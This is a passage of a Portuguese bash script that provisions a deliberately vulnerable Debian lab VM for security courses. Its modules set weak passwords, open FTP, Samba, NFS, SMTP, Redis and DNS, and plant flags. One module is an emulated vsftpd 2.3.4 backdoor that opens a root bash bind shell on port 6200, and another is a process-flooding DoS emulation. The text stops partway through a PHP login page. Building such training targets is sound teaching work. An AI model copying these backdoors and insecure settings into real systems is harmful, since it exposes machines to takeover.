#!/usr/bin/env bash
#
# provision.sh — monta um alvo propositalmente vulnerável para aulas de
# segurança (nível iniciante), num Debian LIMPO, escolhendo o que instalar
# por um MENU.
#
# ┌──────────────────────────────────────────────────────────────────────┐
# │  ISTO DEIXA A MÁQUINA GRAVEMENTE INSEGURA DE PROPÓSITO.                 │
# │  Use SÓ numa VM descartável, isolada da rede/internet.                 │
# │  No Qubes: StandaloneVM, sem netvm (ou rede isolada). Nunca no dom0.   │
# └──────────────────────────────────────────────────────────────────────┘
#
# Uso:
#   sudo ./provision.sh                 # abre o MENU de seleção
#   sudo ./provision.sh --all           # instala tudo (sem menu)
#   sudo ./provision.sh --only dns,web  # instala só esses módulos
#   sudo ./provision.sh --list          # lista os módulos disponíveis
#   sudo ./provision.sh --reip          # re-detecta o IP e reassocia dns/tomcat/wordpress
#   sudo ./provision.sh --all --yes     # tudo, sem pedir confirmação
#
set -euo pipefail

# ------------------------------------------------------------------ helpers --
if [ -t 1 ]; then
  R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'; B='\033[1m'; X='\033[0m'
else R=''; G=''; Y=''; B=''; X=''; fi
log()  { printf '%b[+]%b %s\n' "$G" "$X" "$*"; }
info() { printf '%b[*]%b %s\n' "$B" "$X" "$*"; }
warn() { printf '%b[!]%b %s\n' "$Y" "$X" "$*" >&2; }
die()  { printf '%b[x]%b %s\n' "$R" "$X" "$*" >&2; exit 1; }

set_kv() { # arquivo chave valor -> define/substitui (idempotente)
  local f="$1" k="$2" v="$3"; touch "$f"
  if grep -qE "^\s*#?\s*${k}\b" "$f"; then
    sed -i -E "s|^\s*#?\s*${k}\b.*|${k} ${v}|" "$f"
  else printf '%s %s\n' "$k" "$v" >> "$f"; fi
}
add_user() { local u="$1" p="$2" s="${3:-/bin/bash}"
  id "$u" >/dev/null 2>&1 || useradd -m -s "$s" "$u"; echo "${u}:${p}" | chpasswd; }
svc() { local s="$1"
  if command -v systemctl >/dev/null 2>&1; then
    systemctl enable "$s" >/dev/null 2>&1 || true
    systemctl restart "$s" >/dev/null 2>&1 || warn "não subiu $s — reinicie a VM"
  elif command -v service >/dev/null 2>&1; then
    service "$s" restart >/dev/null 2>&1 || warn "não subiu $s — reinicie a VM"
  else warn "sem systemd — reinicie a VM para subir $s"; fi
}
APT_DONE=0
apt_install() {
  if [ "$APT_DONE" = 0 ]; then
    info "apt-get update..."; DEBIAN_FRONTEND=noninteractive apt-get update -qq || true
    APT_DONE=1
  fi
  info "instalando: $*"
  DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@" || die "falha ao instalar: $*"
}
# variante NAO-fatal (p/ modulos que podem falhar sem abortar o resto)
apt_try() {
  info "instalando (best-effort): $*"
  DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@"
}

# IP alcancavel desta VM (1a coluna do hostname -I). Fonte unica p/ os modulos que
# gravam o IP em disco (dns, tomcat, wordpress) e p/ o --reip.
lab_ip() { hostname -I 2>/dev/null | awk '{print $1}'; }

# --reip: reassocia ao IP ATUAL os servicos que gravaram o IP no provision (a VM
# trocou de rede depois — ex.: snapshot/DHCP entre turmas). Nao regenera flags,
# nao usa internet: so reescreve os 3 pontos com IP fixo e reinicia os servicos.
do_reip() {
  local IP; IP="$(lab_ip)"
  [ -n "$IP" ] || die "reip: nao consegui detectar o IP (hostname -I vazio)"
  info "== reip: reassociando servicos ao IP atual ($IP) =="
  local touched=0

  # 1) DNS: ns1/www resolvem para o IP desta VM (AXFR realista)
  local Z=/etc/bind/db.empresa.local
  if [ -f "$Z" ]; then
    sed -i -E "s|^(ns1[[:space:]]+IN[[:space:]]+A[[:space:]]+).*|\1${IP}|; \
               s|^(www[[:space:]]+IN[[:space:]]+A[[:space:]]+).*|\1${IP}|" "$Z"
    # sobe o serial do SOA (10 digitos) p/ propagar a mudanca
    sed -i -E "s/[0-9]{10}( 604800 86400)/$(date +%Y%m%d%H)\1/" "$Z"
    if named-checkzone empresa.local "$Z" >/dev/null 2>&1; then
      if systemctl list-unit-files 2>/dev/null | grep -q '^named'; then svc named; else svc bind9; fi
      log "dns: ns1/www -> $IP"; touched=1
    else warn "dns: named-checkzone reclamou — zona NAO recarregada"; fi
  fi

  # 2) Tomcat: connector 8082 precisa bindar no IP externo (nao no antigo)
  local TX=/etc/tomcat10/server.xml
  if [ -f "$TX" ]; then
    # nas linhas do connector 8082: troca o address existente OU insere se faltar
    sed -i -E '/port="8082"/{ s/address="[^"]*"/address="'"$IP"'"/; t; s#port="8082"#port="8082" address="'"$IP"'"#; }' "$TX"
    svc tomcat10; log "tomcat: connector 8082 -> address=$IP"; touched=1
  fi

  # 3) WordPress: siteurl/home + refs no banco
  local W=/var/www/html/wordpress
  if [ -d "$W" ] && command -v wp >/dev/null 2>&1; then
    local WPC="sudo -u www-data wp --path=$W"
    local cur oldhost
    cur="$($WPC option get siteurl 2>/dev/null || true)"
    oldhost="$(printf '%s' "$cur" | sed -E 's#https?://([^/]+).*#\1#')"
    $WPC option update siteurl "http://${IP}/wordpress" >/dev/null 2>&1 || true
    $WPC option update home    "http://${IP}/wordpress" >/dev/null 2>&1 || true
    if [ -n "$oldhost" ] && [ "$oldhost" != "$IP" ]; then
      $WPC search-replace "//$oldhost" "//$IP" --all-tables --report-changed-only >/dev/null 2>&1 || true
    fi
    log "wordpress: siteurl/home -> http://${IP}/wordpress"; touched=1
  fi

  [ "$touched" = 1 ] || warn "reip: nenhum modulo com IP fixo instalado (dns/tomcat/wordpress)"
  log "reip concluido."
}

# ---------------------------------------------------------- registro de módulos
MODS=(base ssh ftp vsftpd234 ftpdos samba dns web corvo apache apachecve nginx nginxcve nfs smtp redis log4j snmp mysql postgres tomcat wordpress phpmyadmin rservices telnetd unrealircd javarmi distcc privesc)
declare -A TITLE
TITLE[base]="Usuários e senhas fracas (+ flag de foothold)"
TITLE[ssh]="SSH com senha fraca / login de root"
TITLE[ftp]="FTP anônimo com upload (vsftpd, porta 2121) + creds vazadas"
TITLE[vsftpd234]="Backdoor vsftpd 2.3.4 na porta 21 (CVE-2011-2523) -> shell root"
TITLE[ftpdos]="FTP legado 2.3.2 na porta 2100: DoS por glob (CVE-2011-0762)"
TITLE[samba]="Samba/NetBIOS aberto a convidado (enum4linux)"
TITLE[dns]="DNS com transferência de zona liberada (AXFR)"
TITLE[web]="App web: SQLi, XSS, LFI, upload/RCE, cmd injection"
TITLE[corvo]="Loja web Corvo vulneravel (:8090) — alvo do livro Burp para Hackers"
TITLE[apache]="Apache mal configurado (server-status, userdir, listing, .htpasswd)"
TITLE[nginx]="nginx com path traversal (alias) e .git exposto (:8080)"
TITLE[nfs]="NFS com no_root_squash + RPC/rpcbind (rpcinfo/showmount)"
TITLE[smtp]="SMTP open relay (Postfix) + VRFY para enumeração"
TITLE[redis]="Redis sem senha, exposto na rede (RCE)"
TITLE[log4j]="App Java vulneravel ao Log4Shell CVE-2021-44228 (PESADO: baixa JDK 8)"
TITLE[snmp]="SNMP com community public/private (enumeracao/recon)"
TITLE[mysql]="MariaDB exposto na rede + privilegio FILE (LOAD_FILE/OUTFILE)"
TITLE[postgres]="PostgreSQL exposto + superuser fraco (COPY FROM PROGRAM = RCE)"
TITLE[tomcat]="Tomcat manager com credenciais fracas (deploy WAR = RCE)"
TITLE[wordpress]="WordPress com admin fraco + user enum (via wp-cli)"
TITLE[phpmyadmin]="phpMyAdmin exposto (usa as creds do mysql)"
TITLE[apachecve]="Apache 2.4.49 legado emulado :8081 (CVE-2021-41773/42013 RCE, 2024-40725 fonte, 2025-49630 DoS)"
TITLE[nginxcve]="nginx 1.26.0 vulneravel real :8084 (CVE-2026-42533: DoS por captura-clobber no script engine)"
TITLE[rservices]="r-services (rsh/rlogin) com confiança .rhosts '+ +' -> shell sem senha (512-514)"
TITLE[telnetd]="telnetd (GNU Inetutils) CVE-2026-24061: USER='-f root' -> login root sem senha (23) [KEV]"
TITLE[unrealircd]="UnrealIRCd 3.2.8.1 com backdoor de cadeia de suprimentos (CVE-2010-2075) na 6667"
TITLE[javarmi]="Java RMI registry REAL exposto (1099): classloading remoto = RCE (java_rmi_server)"
TITLE[distcc]="distccd REAL exposto (3632): execução de comando via job de compilação (distcc_exec)"
TITLE[privesc]="Escalação de privilégio (SUID, sudo, cron)"

usage() {
  echo "Uso: sudo ./provision.sh [--all | --only m1,m2,...] [--yes] [--list] [--reip]"
  echo "Módulos:"; for m in "${MODS[@]}"; do printf "  %-9s %s\n" "$m" "${TITLE[$m]}"; done
}

# --------------------------------------------------------------- args + seleção
declare -A SEL; for m in "${MODS[@]}"; do SEL[$m]=0; done
INTERACTIVE=1; ASSUME_YES=0; REIP=0
while [ $# -gt 0 ]; do
  case "$1" in
    --all)  INTERACTIVE=0; for m in "${MODS[@]}"; do SEL[$m]=1; done;;
    --only) INTERACTIVE=0; IFS=, read -ra P <<<"${2:-}"; shift
            for p in "${P[@]}"; do
              [ -n "${TITLE[$p]:-}" ] || die "módulo desconhecido: '$p' (veja --list)"
              SEL[$p]=1
            done;;
    --yes)  ASSUME_YES=1;;
    --reip) REIP=1;;
    --list) usage; exit 0;;
    -h|--help) usage; exit 0;;
    *) die "opção desconhecida: '$1' (veja --help)";;
  esac; shift
done

# ------------------------------------------------------------------- guardas --
[ "$(id -u)" -eq 0 ] || die "rode como root:  sudo ./provision.sh"
if [ "$REIP" = 1 ]; then do_reip; exit 0; fi
command -v apt-get >/dev/null 2>&1 || die "feito para Debian/Ubuntu (apt-get ausente)"
case "$(hostname 2>/dev/null)" in *prod*|*production*) die "hostname parece produção — abortando";; esac

# menu interativo (marca todos por padrão; número alterna)
if [ "$INTERACTIVE" = 1 ]; then
  for m in "${MODS[@]}"; do SEL[$m]=1; done
  while :; do
    clear 2>/dev/null || true
    echo; echo "  Selecione o que instalar no laboratório:"; echo
    i=1; for m in "${MODS[@]}"; do
      mark=' '; [ "${SEL[$m]}" = 1 ] && mark='x'
      printf "   %2d) [%s] %-9s %s\n" "$i" "$mark" "$m" "${TITLE[$m]}"; i=$((i+1))
    done
    echo
    echo "   a) marcar todos    n) desmarcar todos    ENTER) confirmar    q) sair"
    read -r -p "  > " ans || ans=""
    case "$ans" in
      "") break;;
      a) for m in "${MODS[@]}"; do SEL[$m]=1; done;;
      n) for m in "${MODS[@]}"; do SEL[$m]=0; done;;
      q) die "cancelado";;
      *[!0-9\ ]*) warn "entrada inválida"; sleep 1;;
      *) for n in $ans; do idx=$((n-1)); m="${MODS[$idx]:-}"
           [ -n "$m" ] && SEL[$m]=$(( 1 - SEL[$m] )); done;;
    esac
  done
fi

# dependências: ssh/ftp/privesc precisam dos usuários do módulo base
if [ "${SEL[ssh]}" = 1 ] || [ "${SEL[ftp]}" = 1 ] || [ "${SEL[privesc]}" = 1 ]; then
  SEL[base]=1
fi

# nada selecionado?
CHOSEN=(); for m in "${MODS[@]}"; do [ "${SEL[$m]}" = 1 ] && CHOSEN+=("$m"); done
[ "${#CHOSEN[@]}" -gt 0 ] || die "nenhum módulo selecionado — nada a fazer"

# confirmação
if [ "$ASSUME_YES" != 1 ]; then
  echo; warn "Vai instalar vulnerabilidades: ${CHOSEN[*]}"
  warn "NÃO rode numa máquina que te importa ou conectada à internet."
  read -r -p "  Digite 'sim' para continuar: " ok || ok=""
  [ "$ok" = "sim" ] || die "cancelado"
fi

# --------------------------------------------------------------------- flags --
rnd() { head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n'; }
SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GAB=/root/GABARITO.md
gab() { printf '%s\n' "$*" >> "$GAB"; }
FLAG_WEB="FLAG{web_sqli_$(rnd)}"
FLAG_USER="FLAG{foothold_$(rnd)}"
FLAG_ROOT="FLAG{root_$(rnd)}"
FLAG_DNS="FLAG{dns_axfr_$(rnd)}"
FLAG_NGINX="FLAG{nginx_traversal_$(rnd)}"
FLAG_NFS="FLAG{nfs_norootsquash_$(rnd)}"
FLAG_REDIS="FLAG{redis_noauth_$(rnd)}"
FLAG_APACHE="FLAG{apache_misconf_$(rnd)}"
FLAG_SMB="FLAG{smb_rpc_$(rnd)}"
FLAG_LOG4J="FLAG{log4shell_$(rnd)}"
FLAG_SNMP="FLAG{snmp_$(rnd)}"
FLAG_MYSQL="FLAG{mysql_$(rnd)}"
FLAG_PG="FLAG{pg_$(rnd)}"
FLAG_TOMCAT="FLAG{tomcat_$(rnd)}"
FLAG_WP="FLAG{wordpress_$(rnd)}"
FLAG_FTPBD="FLAG{ftp_vsftpd234_backdoor_$(rnd)}"
FLAG_APACHECVE="FLAG{apache_cve41773_$(rnd)}"
FLAG_APACHESRC="FLAG{apache_cve40725_$(rnd)}"
FLAG_RSH="FLAG{rservices_rhosts_$(rnd)}"
FLAG_TELNET="FLAG{telnet_cve24061_$(rnd)}"
FLAG_IRC="FLAG{irc_unrealircd_$(rnd)}"
FLAG_RMI="FLAG{javarmi_$(rnd)}"
FLAG_DISTCC="FLAG{distcc_$(rnd)}"

# gabarito (só para o instrutor)
: > "$GAB"; chmod 0600 "$GAB"
gab "# Gabarito — laboratório vulnerável (só para o instrutor)"
gab ""; gab "Módulos instalados: ${CHOSEN[*]}"; gab ""

log "Provisionando: ${CHOSEN[*]}"

# ============================================================ MÓDULOS
mod_base() {
  info "== base: usuários e credenciais fracas =="
  # o livro (caps 03, 08, ...) assume o hostname "exploitable" nos prompts, no
  # sysDescr/sysName do SNMP e nas saídas de shell; a instalação Debian padrão
  # fica "debian". Fixa o hostname (o guard de produção já rodou lá em cima).
  hostnamectl set-hostname exploitable 2>/dev/null || echo exploitable > /etc/hostname
  sed -i 's/\b\(debian\|localhost\.localdomain\)\b/exploitable/g' /etc/hosts 2>/dev/null || true
  grep -q exploitable /etc/hosts || echo "127.0.1.1 exploitable" >> /etc/hosts
  add_user msfadmin msfadmin
  add_user aluno    aluno
  add_user servico  servico123
  echo "root:toor" | chpasswd
  printf '%s\n' "$FLAG_USER" > /home/aluno/user.txt
  chown aluno:aluno /home/aluno/user.txt; chmod 0644 /home/aluno/user.txt
  mkdir -p /var/backups
  printf '# senhas antigas de um backup\nmsfadmin:msfadmin\naluno:aluno\n' \
    > /var/backups/credenciais.old; chmod 0644 /var/backups/credenciais.old
}

mod_ssh() {
  info "== ssh: autenticação fraca =="
  apt_install openssh-server
  set_kv /etc/ssh/sshd_config PasswordAuthentication yes
  set_kv /etc/ssh/sshd_config PermitRootLogin yes
  set_kv /etc/ssh/sshd_config PermitEmptyPasswords no
  svc ssh
}

mod_ftp() {
  info "== ftp: vsftpd anônimo com upload (porta 2121) =="
  apt_install vsftpd
  cat > /etc/vsftpd.conf <<'EOF'
listen=YES
listen_ipv6=NO
listen_port=2121
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_root=/srv/ftp
pam_service_name=vsftpd
seccomp_sandbox=NO
ftpd_banner=Bem-vindo ao FTP interno (vsftpd)
EOF
  mkdir -p /srv/ftp/pub
  cat > /srv/ftp/pub/leia-me.txt <<'EOF'
Backup do servidor. Lembrete pro time:
  banco:   webapp / webapp123
  servico: servico / servico123
APAGAR ISTO DEPOIS.
EOF
  chown -R ftp:ftp /srv/ftp/pub; chmod 555 /srv/ftp; chmod 777 /srv/ftp/pub
  svc vsftpd
}

mod_vsftpd234() {
  info "== vsftpd234: vsftpd 2.3.4 na porta 21 (CVE-2011-2523) =="
  apt_install socat
  printf '%s\n' "$FLAG_FTPBD" > /root/flag_ftp_backdoor.txt; chmod 0600 /root/flag_ftp_backdoor.txt
  cat > /usr/local/sbin/vsftpd234.sh <<'EOF'
#!/bin/bash
BD=6200
printf '220 (vsFTPd 2.3.4)\r\n'
trig=0
while IFS= read -r line; do
  line="${line%$'\r'}"
  verb="${line%% *}"; verb="${verb^^}"
  case "$verb" in
    USER)
      case "$line" in *':)'*) trig=1;; esac
      printf '331 Please specify the password.\r\n' ;;
    PASS)
      if [ "$trig" = 1 ]; then
        if ! ss -ltn 2>/dev/null | grep -q ":$BD[[:space:]]"; then
          setsid socat TCP-LISTEN:$BD,reuseaddr,fork EXEC:'/bin/bash -i',pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &
        fi
        sleep 2; exit 0
      fi
      printf '230 Login successful.\r\n' ;;
    SYST) printf '215 UNIX Type: L8\r\n' ;;
    QUIT) printf '221 Goodbye.\r\n'; exit 0 ;;
    "")   : ;;
    *)    printf '530 Please login with USER and PASS.\r\n' ;;
  esac
done
EOF
  chmod 0755 /usr/local/sbin/vsftpd234.sh
  cat > /etc/systemd/system/vsftpd234.service <<'EOF'
[Unit]
Description=Lab vsftpd 2.3.4 backdoor (CVE-2011-2523)
After=network.target
[Service]
ExecStart=/usr/bin/socat -T120 TCP-LISTEN:21,reuseaddr,fork EXEC:/usr/local/sbin/vsftpd234.sh,pty,raw,echo=0
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc vsftpd234
}

mod_ftpdos() {
  info "== ftpdos: vsftpd 2.3.2 na porta 2100 (CVE-2011-0762) =="
  apt_install socat
  cat > /usr/local/sbin/ftpdos.sh <<'EOF'
#!/bin/bash
N=4000
T=120
burn() {
  local i
  for ((i=0;i<N;i++)); do timeout "$T" sleep "$T" & done
  for i in 1 2 3 4; do timeout "$T" bash -c 'while :; do :; done' & done
}
crafted() { case "$1" in *'{'*|*'['*|*'*'*'*'*'*'*) return 0;; *) return 1;; esac; }
printf '220 (vsFTPd 2.3.2)\r\n'
while IFS= read -r line; do
  line="${line%$'\r'}"
  verb="${line%% *}"; verb="${verb^^}"; arg="${line#* }"; [ "$arg" = "$line" ] && arg=""
  case "$verb" in
    USER) printf '331 Please specify the password.\r\n' ;;
    PASS) printf '230 Login successful.\r\n' ;;
    SYST) printf '215 UNIX Type: L8\r\n' ;;
    TYPE) printf '200 Switching to Binary mode.\r\n' ;;
    PWD)  printf '257 "/"\r\n' ;;
    LIST|NLST|STAT)
      printf '150 Here comes the directory listing.\r\n'
      if crafted "$arg"; then burn >/dev/null 2>&1
      else printf 'drwxr-xr-x 2 ftp ftp 4096 pub\r\n'; fi
      printf '226 Directory send OK.\r\n' ;;
    QUIT) printf '221 Goodbye.\r\n'; exit 0 ;;
    "")   : ;;
    *)    printf '530 Please login with USER and PASS.\r\n' ;;
  esac
done
EOF
  chmod 0755 /usr/local/sbin/ftpdos.sh
  cat > /etc/systemd/system/ftpdos.service <<'EOF'
[Unit]
Description=Lab FTP legado vulneravel a DoS por glob (CVE-2011-0762)
After=network.target
[Service]
ExecStart=/usr/bin/socat -T120 TCP-LISTEN:2100,reuseaddr,fork EXEC:/usr/local/sbin/ftpdos.sh,pty,raw,echo=0
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc ftpdos
}

mod_samba() {
  info "== samba: NetBIOS + compartilhamento guest =="
  apt_install samba
  # NetBIOS + enumeração anônima habilitados (enum4linux/nmblookup)
  if ! grep -q '^\[publico\]' /etc/samba/smb.conf; then
    sed -i '/^\[global\]/a\   netbios name = FILESERVER\n   server string = Servidor de Arquivos\n   map to guest = Bad User\n   guest account = nobody\n   restrict anonymous = 0' /etc/samba/smb.conf
    cat >> /etc/samba/smb.conf <<'EOF'

[publico]
   comment = Publico (guest)
   path = /srv/samba/publico
   browseable = yes
   read only = no
   guest ok = yes
   guest only = yes
   force user = nobody

[privado]
   comment = Setor administrativo
   path = /srv/samba/privado
   browseable = yes
   read only = no
   valid users = msfadmin

[backup]
   comment = Backups (restrito)
   path = /srv/samba/backup
   valid users = backupsvc
   read only = yes
EOF
  fi
  # SMB1/NT1 habilitado (propositalmente inseguro): os scripts nmap smb-* (smb-os-discovery,
  # smb-security-mode, smb-enum-shares, smb-enum-users) negociam SMBv1; sem NT1 o Samba moderno
  # recusa e o nmap não devolve Host script results. É o vetor de recon do capítulo 6 do Kalika.
  if ! grep -qE '^\s*server min protocol\s*=\s*NT1' /etc/samba/smb.conf; then
    sed -i '/^\[global\]/a\   server min protocol = NT1\n   client min protocol = NT1\n   ntlm auth = yes' /etc/samba/smb.conf
  fi
  mkdir -p /srv/samba/publico /srv/samba/privado
  echo "Dica: a app web esta na porta 80; o FTP na 21." > /srv/samba/publico/notas.txt
  echo "Credenciais do banco: webapp / webapp123" > /srv/samba/privado/segredo.txt
  chmod -R 0777 /srv/samba/publico
  chmod -R 0770 /srv/samba/privado
  # define a senha samba de msfadmin (se o usuário existir) e o torna dono do share
  # [privado] (o dir/segredo.txt nascem root:root 0770; sem chown, valid users=msfadmin
  # ainda bate em ACCESS_DENIED no filesystem — msfadmin cai em "other" = sem permissão)
  if id msfadmin >/dev/null 2>&1; then
    chown -R msfadmin:msfadmin /srv/samba/privado
    (echo 'msfadmin'; echo 'msfadmin') | smbpasswd -s -a msfadmin >/dev/null 2>&1 || true
  fi
  # usuario de servico p/ enumeracao RPC/SAMR (null session) + share [backup] com flag
  add_user backupsvc backup123
  (echo 'backup123'; echo 'backup123') | smbpasswd -s -a backupsvc >/dev/null 2>&1 || true
  mkdir -p /srv/samba/backup
  printf '%s\n' "$FLAG_SMB" > /srv/samba/backup/flag.txt
  chown backupsvc:backupsvc /srv/samba/backup/flag.txt 2>/dev/null || true
  chmod 0640 /srv/samba/backup/flag.txt
  svc smbd; svc nmbd
}

mod_apache() {
  info "== apache: configuração de servidor insegura =="
  apt_install apache2 apache2-utils
  a2enmod status userdir >/dev/null 2>&1 || true
  # server-status exposto a qualquer um (info disclosure)
  cat > /etc/apache2/conf-available/lab-status.conf <<'EOF'
ExtendedStatus On
<Location /server-status>
    SetHandler server-status
    Require all granted
</Location>
<Location /server-info>
    SetHandler server-info
    Require all granted
</Location>
EOF
  a2enmod info >/dev/null 2>&1 || true
  a2enconf lab-status >/dev/null 2>&1 || true
  # userdir (/~aluno/) apontando pro home do aluno, se existir
  if id aluno >/dev/null 2>&1; then
    mkdir -p /home/aluno/public_html
    printf '%s\n' "$FLAG_APACHE" > /home/aluno/public_html/flag.txt
    echo "<h1>pagina do aluno</h1>" > /home/aluno/public_html/index.html
    chmod 711 /home/aluno; chmod -R 755 /home/aluno/public_html
  fi
  # diretório com listagem + .htpasswd exposto (hash pra crackear)
  mkdir -p /var/www/html/arquivos
  echo "relatorio financeiro interno" > /var/www/html/arquivos/relatorio.txt
  local HTP; HTP="$(openssl passwd -apr1 admin123 2>/dev/null || echo '$apr1$saltsalt$0000000000000000000000')"
  printf 'admin:%s\n' "$HTP" > /var/www/html/arquivos/.htpasswd
  cat > /etc/apache2/conf-available/lab-arquivos.conf <<'EOF'
<Directory /var/www/html/arquivos>
    Options +Indexes
    Require all granted
    AllowOverride None
</Directory>
<Files ".htpasswd">
    Require all granted
</Files>
EOF
  a2enconf lab-arquivos >/dev/null 2>&1 || true
  svc apache2
}

mod_nginx() {
  info "== nginx: path traversal por alias + .git exposto (:8080) =="
  apt_install nginx
  rm -f /etc/nginx/sites-enabled/default    # evita conflito na porta 80 com o apache
  mkdir -p /var/www/nginx/site /var/www/nginx/downloads /var/www/nginx/secret
  echo "<h1>Site publico</h1>" > /var/www/nginx/site/index.html
  echo "manual.pdf, catalogo.pdf ..." > /var/www/nginx/downloads/publico.txt
  printf '%s\n' "$FLAG_NGINX" > /var/www/nginx/secret/flag.txt
  # config interno "esquecido" FORA da pasta servida -> alvo do path traversal
  mkdir -p /var/www/nginx/private
  cat > /var/www/nginx/private/db.conf <<'CONF'
# configuracao interna — NAO servir publicamente
DB_HOST=127.0.0.1
DB_NAME=intranet
DB_USER=svc_intranet
DB_PASS=Intr@net#2024
API_TOKEN=sk_live_4f3c9a7e21b8
CONF
  chmod 0644 /var/www/nginx/private/db.conf
  # repo git "esquecido" servido publicamente (source/secret disclosure)
  mkdir -p /var/www/nginx/site/.git
  echo "ref: refs/heads/master" > /var/www/nginx/site/.git/HEAD
  echo "[remote \"origin\"] url = http://webapp:webapp123@interno/repo.git" \
    > /var/www/nginx/site/.git/config
  cat > /etc/nginx/sites-available/lab <<'EOF'
server {
    listen 8080 default_server;
    root /var/www/nginx/site;
    autoindex on;                      # listagem de diretório habilitada


    location /downloads {
        alias /var/www/nginx/downloads/;
    }
    # .git NÃO é bloqueado -> exposição de código-fonte/segredos
}
EOF
  ln -sf ../sites-available/lab /etc/nginx/sites-enabled/lab
  nginx -t >/dev/null 2>&1 || warn "nginx -t reclamou da config"
  svc nginx
}

mod_nfs() {
  info "== nfs: export com no_root_squash (+ RPC/rpcbind) =="
  apt_install nfs-kernel-server rpcbind
  mkdir -p /srv/nfs/publico
  printf '%s\n' "$FLAG_NFS" > /srv/nfs/publico/flag.txt
  chmod -R 0777 /srv/nfs
  echo '/srv/nfs *(rw,sync,no_root_squash,no_subtree_check,insecure)' > /etc/exports
  modprobe nfsd 2>/dev/null || true          # garante o módulo do kernel
  systemctl unmask rpcbind rpcbind.socket nfs-server 2>/dev/null || true  # Qubes deixa rpcbind masked
  svc rpcbind                                 # rpcbind PRIMEIRO (nfs depende dele)
  svc nfs-kernel-server
  exportfs -ra 2>/dev/null || true            # exporta depois do servidor no ar
}

mod_smtp() {
  info "== smtp: Postfix open relay + VRFY =="
  echo "postfix postfix/main_mailer_type select Internet Site" | debconf-set-selections
  echo "postfix postfix/mailname string empresa.local" | debconf-set-selections
  apt_install postfix
  postconf -e 'inet_interfaces = all'
  postconf -e 'inet_protocols = ipv4'
  # o banner/HELO usam $myhostname; sem isto o Postfix anuncia "debian" e não
  # "empresa.local" (o mailname do debconf não vai para o banner) — o cap 07 do
  # Kalika depende do domínio empresa.local no banner e nos e-mails forjados.
  postconf -e 'myhostname = empresa.local'
  postconf -e 'mydomain = empresa.local'
  postconf -e 'mynetworks = 0.0.0.0/0'
  postconf -e 'smtpd_recipient_restrictions = permit'
  postconf -e 'smtpd_helo_required = no'
  postconf -e 'disable_vrfy_command = no'
  svc postfix
}

mod_redis() {
  info "== redis: sem senha, exposto na rede =="
  apt_install redis-server
  local RC=/etc/redis/redis.conf
  sed -i 's/^bind .*/bind 0.0.0.0 ::/' "$RC" 2>/dev/null || true
  sed -i 's/^protected-mode .*/protected-mode no/' "$RC" 2>/dev/null || true
  grep -q '^protected-mode' "$RC" 2>/dev/null || echo 'protected-mode no' >> "$RC"
  # sem requirepass -> sem autenticação
  sed -i 's/^\s*requirepass /# requirepass /' "$RC" 2>/dev/null || true
  svc redis-server; sleep 1
  redis-cli set flag "$FLAG_REDIS" >/dev/null 2>&1 || true
  redis-cli set nota "servidor de cache interno" >/dev/null 2>&1 || true
}

mod_dns() {
  info "== dns: BIND9 com transferência de zona (AXFR) liberada =="
  apt_install bind9 bind9utils
  cat > /etc/bind/named.conf.local <<'EOF'
zone "empresa.local" {
    type master;
    file "/etc/bind/db.empresa.local";
    allow-transfer { any; };
};
EOF
  # ns1/www resolvem para o IP alcancavel DESTA VM (nao 127.0.0.1): senao dnsrecon/
  # dnsenum/fierce mandam o AXFR para localhost e voltam vazios (eles resolvem o NS
  # pelo resolvedor do sistema). O dig axfr @<ip> funciona nos dois casos. Ver cap 4.
  local LAB_IP; LAB_IP="$(lab_ip)"
  [ -n "$LAB_IP" ] || LAB_IP="127.0.0.1"
  cat > /etc/bind/db.empresa.local <<EOF
\$TTL 604800
@   IN  SOA ns1.empresa.local. admin.empresa.local. (
        $(date +%Y%m%d%H) 604800 86400 2419200 604800 )
@       IN  NS      ns1.empresa.local.
@       IN  MX  10  mail.empresa.local.
ns1     IN  A       ${LAB_IP}
www     IN  A       ${LAB_IP}
mail    IN  A       10.0.0.3
intranet IN A       10.0.0.5
vpn     IN  A       10.0.0.6
backup  IN  A       10.0.0.7
admin   IN  A       10.0.0.8
dev     IN  CNAME   www.empresa.local.
_secret IN  TXT     "${FLAG_DNS}"
EOF
  # valida antes de subir
  named-checkconf 2>/dev/null || warn "named-checkconf reclamou (verifique /etc/bind)"
  named-checkzone empresa.local /etc/bind/db.empresa.local >/dev/null 2>&1 \
    || warn "named-checkzone reclamou da zona"
  if systemctl list-unit-files 2>/dev/null | grep -q '^named'; then svc named; else svc bind9; fi
}

mod_web() {
  info "== web: Apache + PHP + MariaDB vulnerável =="
  apt_install apache2 php libapache2-mod-php php-mysql mariadb-server
  # expose_php On -> Apache manda "X-Powered-By: PHP/x.y" (fingerprint do cap 09);
  # o PHP do Debian vem com Off. Liga em todos os php.ini do apache disponiveis.
  for ini in /etc/php/*/apache2/php.ini; do
    [ -f "$ini" ] && sed -i 's/^expose_php = Off/expose_php = On/' "$ini"
  done
  local W=/var/www/html
  rm -f "$W/index.html"; mkdir -p "$W/uploads"

  cat > "$W/config.php" <<'EOF'
<?php
define('DB_HOST','127.0.0.1'); define('DB_USER','webapp');
define('DB_PASS','webapp123'); define('DB_NAME','webapp');
EOF
  cp "$W/config.php" "$W/config.php.bak"

  cat > "$W/index.php" <<'EOF'
<!doctype html><meta charset="utf-8"><title>Portal Interno</title>
<h1>Portal Interno</h1>
<!-- TODO: remover /config.php.bak antes de subir pra producao -->
<ul>
 <li><a href="login.php">Login (área restrita)</a></li>
 <li><a href="busca.php">Buscar funcionário</a></li>
 <li><a href="pagina.php?arquivo=home.html">Sobre</a></li>
 <li><a href="upload.php">Enviar currículo</a></li>
 <li><a href="ping.php">Ferramenta de rede (ping)</a></li>
</ul>
EOF
  echo "<h2>Sobre</h2><p>Empresa fictícia de laboratório.</p>" > "$W/home.html"

  cat > "$W/login.php" <<'EOF'
<?php require 'config.php';
$c=new mysqli(DB_HOST,DB_USER,DB_PASS,DB_NAME); $msg='';
if($_SERVER['REQUEST_METHOD']==='POST'){
  $u=$_POST['usuario']??''; $p=$_POST['senha']??'';

